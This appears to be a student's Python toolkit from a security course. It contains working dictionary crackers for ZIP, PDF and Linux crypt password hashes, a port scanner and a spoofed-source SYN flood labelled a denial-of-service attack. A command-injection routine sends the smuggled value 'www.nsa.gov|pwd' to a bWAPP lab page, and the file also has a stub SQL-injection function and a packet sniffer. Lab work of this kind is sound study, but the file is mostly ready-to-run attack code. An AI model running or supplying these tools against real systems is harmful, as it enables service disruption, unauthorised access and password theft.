# !/usr/bin/env python3
# Andrew Quijano
# UNI: afq2101
from __future__ import print_function
from os import popen
from pikepdf import open as PdfFileReader
import crypt
from zipfile import ZipFile
import urllib.request
import urllib.error
import requests
from extra import *
counter = 0


def extract_file(zip_file, password):
    try:
        ZipFile(zip_file).extractall(pwd=password.encode('cp850', 'replace'))
        return True
    except Exception:
        return False


def crack_zip_file(zip_file, file="password.txt"):
    with open(file) as fd:
        for line in fd:
            if '#' in line:
                continue
            password = line.strip('\n')
            if extract_file(zip_file, password):
                print("[+] Password = " + password)
                return
    print("Password not found!")


def crack_local_host(crypt_pass, file="password.txt"):
    with open(file) as fd:
        for word in fd:
            if '#' in word:
                continue
            word = word.strip('\n')
            print(word)
            salt = crypt_pass[3:12]
            passwd = crypt.crypt(word, '$6$' + salt)
            if passwd == crypt_pass:
                print("[+] Found Password: " + word)
                return
    print("Password Not Found!")


def extract_pdf(pdf, password):
    try:
        with open(pdf, "rb") as input_file:
            PdfFileReader(input_file, password)
            return True
    except Exception:
        return False


def crack_pdf_file(pdf, file="password.txt"):
    with open(file, "r") as fd:
        for line in fd:
            if '#' in line:
                continue
            password = line.strip('\n')
            if extract_pdf(pdf, password):
                print("[+] Password = " + password)
                return
    print("Password Not Found!")


def network_scan(ip_address):
    host_scan(ip_address, min_port=1024, max_port=1050)
    udp_ping(ip_address, min_port=1024, max_port=1050)
    # GET NETWORK ADDRESS. ASSUMES /24!
    network = get_network_address(ip_address)
    arp_ping(network)


def get_network_address(ip_addr, mask="/24"):
    ip = ip_addr.split('.')
    ip[3] = '0'
    return '.'.join(ip) + mask


# Remember for this to work you must disable Kernel from resetting TCP!
# For now, just do a generic TCP Handshake with a regular server!
def tcp_handshake(destination_ip, http_path, src_ip="192.168.118.129", destination_port=80):
    http_message = \
        "GET " + http_path + " HTTP/1.1\r\n" \
        "Host:"+destination_ip+"\r\n" \
        "Accept-Encoding: gzip, deflate\r\n\r\n"
    ip_packet = IP(src=src_ip, dst=destination_ip)

    src_port = random.randint(1025, 65535)
    # SEND SYN
    syn = ip_packet / TCP(sport=src_port, dport=destination_port, flags='S')

    # Get SYN_ACK
    syn_ack = sr1(syn)

    # Send SYN_ACK
    out_ack = ip_packet / TCP(dport=destination_port,
                              sport=syn_ack[TCP].dport,
                              seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
    send(out_ack)

    # Send the HTTP GET with ACK
    get_request = ip_packet / TCP(dport=destination_port,
                                  sport=syn_ack[TCP].dport,
                                  seq=syn_ack[TCP].ack,
                                  ack=syn_ack[TCP].seq + 1, flags='A') / Raw(load=http_message)

    # Start a loop to keep using get until content length is 0! Call Connection Close as well
    get_request.show()
    # reply = sr1(get_request, multi=True)
    # for r in reply:
    # r[1].show()
    # text = r[1].getlayer(Raw)
    # print(text)
    # if text is not None:
    # print(text.decode())

    # NEED TO ADD CLOSING TCP!
    # FIN = ip_packet/TCP(sport=src_port, dport=destination_port, flags="FA",
    #                    seq=syn_ack.ack, ack=syn_ack.seq + 1)
    # FINACK = sr1(FIN)
    # LASTACK = ip_packet/TCP(sport=src_port, dport=destination_port,
    #                         flags="A", seq=FINACK.ack, ack=FINACK.seq + 1)
    # send(LASTACK)


def get(destination_ip, http_path):
    try:
        contents = urllib.request.urlopen("http://"+destination_ip+http_path)
        reply = contents.read().decode('utf-8')
        return reply

    except urllib.error.HTTPError:
        # Return code error (e.g. 404, 501, ...)
        # print('HTTPError: {}'.format(e.code))
        return None
    except urllib.error.URLError:
        # Not an HTTP-specific error (e.g. connection refused)
        # print('URLError: {}'.format(e.reason))
        return None


# Scan which ports are open!
def port_scanner(src_ip="127.0.0.1", target_ip="127.0.0.1", src_port=1024, destination_port=65535):
    current_port = src_port
    while current_port != destination_port:
        port_scanning_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=src_port, dport=current_port)
        port_scanning_packet.show()
        send(port_scanning_packet)
        current_port = current_port + 1


# Option 1 - Conduct Denial of Service Attack
def syn_flood(target_ip, target_port, packets_send=1000000):
    count = 0
    print("START SYN_FLOOD")
    while count < packets_send:
        # Creates the packet and assigns it to variable a
        a = IP(src="127.0.0.1", dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
        send(a)  # Sends the Packet
        count = count + 1
        # print(str(count) + " Packets Sent")
    print("END_SYN_FLOOD")


# Option 3 - SQL Inject
def sql_inject(host, target_path, sql_attacks="sql_attack.txt"):
    with open(sql_attacks) as fd:
        for line in fd:
            print(line)


def os(url="http://192.168.118.130/bWAPP/commandi.php", command="www.nsa.gov|pwd"):
    r = requests.post(url=url, data=command)
    with open("out.txt", "w") as f:
        f.write(r.text)


# Define our Custom Action function
def custom_action(incoming_packet):
    global counter
    counter += 1
    src_ip = incoming_packet[0][1].src
    src_port = incoming_packet[0][1].sport
    dest_ip = incoming_packet[0][1].dst
    dest_port = incoming_packet[0][1].dport
    #if port_to_pid[src_port] is not None:
    return 'Packet #{}: {}:{} ==> {}:{} --> PID:{}'.format(counter, src_ip, src_port,
                                                           dest_ip, dest_port, None)
    #elif port_to_pid(dest_port) is not None:
    #    return 'Packet #{}: {}:{} ==> {}:{} --> PID:{}'.format(counter, src_ip, src_port, dest_ip,
    #                                                           dest_port, port_to_pid[dest_port])


def pid_to_port():
    # global port_to_pid
    port_to_pid = {}
    source_ip = popen("hostname -I").read().rstrip()
    mapping = popen("sudo netstat -anp | grep tcp").read().split('\n')
    print("Current IP: " + source_ip)
    for line in mapping:
        result = line.split()
        if len(result) > 0:
            # 3 - source
            # 4 - destination
            # 6 - Process Name/PID
            if result[0] == "tcp":
                s_ip = result[3].split(':')[0]
                d_ip = result[4].split(':')[0]
                if source_ip == s_ip or source_ip == d_ip and result[6] == "TIME_WAIT":
                    s_port = result[3].split(':')[1]
                    d_port = result[4].split(':')[1]
                    pid = result[6].split('/')[0]
                    process_name = result[6].split('/')[1]
                    port_to_pid[s_port] = pid
                    port_to_pid[d_port] = pid
                    print("Source IP/Port" + str(s_ip)+":" + str(s_port))
                    print("Desintation IP/Port" + str(d_ip)+":" + str(d_port))
                    print("Process ID: " + pid + " Name: " + process_name)
    return port_to_pid


def stop():
    global counter
    if counter >= 100:
        print("END NOW: " + str(counter))
        return True
    else:
        return False


# Option 5 - Passively collect statistics on Packets and Bytes for all ports
def read_ip(time_frame):
    pid_to_port()
    sniff(filter="ip and tcp", prn=custom_action, stop_filter=None)
